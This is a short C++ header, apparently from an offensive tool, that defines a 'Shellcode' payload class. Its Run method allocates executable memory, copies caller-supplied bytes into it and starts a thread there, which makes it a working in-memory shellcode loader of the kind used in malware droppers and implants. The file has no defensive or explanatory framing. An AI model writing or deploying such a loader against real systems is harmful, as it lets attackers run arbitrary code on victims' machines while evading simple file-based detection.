#pragma once
#include "payload.h"

namespace Payloads {
    class Shellcode : Payload {
    public:
        int payload_size;

        Shellcode() : Payload() {}

        void Run(uint8_t * p, int n) {
            LPVOID ptr = VirtualAlloc(0, n, 0x3000, 0x40);
            RtlMoveMemory(ptr, p, n);


            CreateThread(
                NULL,
                0,
                (LPTHREAD_START_ROUTINE)ptr,
                NULL,
                0,
                0
            );

            Sleep(2000);
        }
    };
}

